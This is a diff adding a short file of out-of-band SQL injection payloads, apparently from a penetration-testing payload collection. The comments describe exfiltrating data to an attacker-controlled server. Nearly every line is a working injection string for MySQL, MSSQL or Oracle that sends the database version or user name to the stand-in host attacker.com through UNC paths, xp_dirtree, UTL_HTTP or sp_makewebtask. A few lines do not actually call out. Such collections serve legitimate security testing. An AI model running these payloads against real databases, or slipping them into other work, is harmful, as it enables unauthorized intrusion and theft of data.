@@ -1,0 +1,12 @@
+# Out-of-Band SQL Injection Payloads
+# Exfiltrates data via DNS or HTTP to attacker-controlled server
+# Replace attacker.com with your controlled domain during testing
+' UNION SELECT LOAD_FILE(CONCAT('\\',(SELECT version()),'.attacker.com\share'))--
+'; exec master..xp_dirtree '//attacker.com/share'--
+'; exec master..xp_fileexist '//attacker.com/share'--
+'; DECLARE @x NVARCHAR(100); SET @x='\\'+@@version+'.attacker.com\a'; EXEC xp_dirtree @x--
+' AND EXTRACTVALUE(1,(SELECT CONCAT(0x7e,(SELECT user()),0x7e,'.',0x7e,'attacker.com')))--
+'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
+'; SELECT UTL_FILE.FOPEN('DIRECTORY','file.txt','W') FROM dual--
+' UNION SELECT sys.fn_varbintohexstr(hashbytes('MD5',(SELECT @@version)))--
+'; EXEC sp_makewebtask 'http://attacker.com/',(SELECT @@version)--
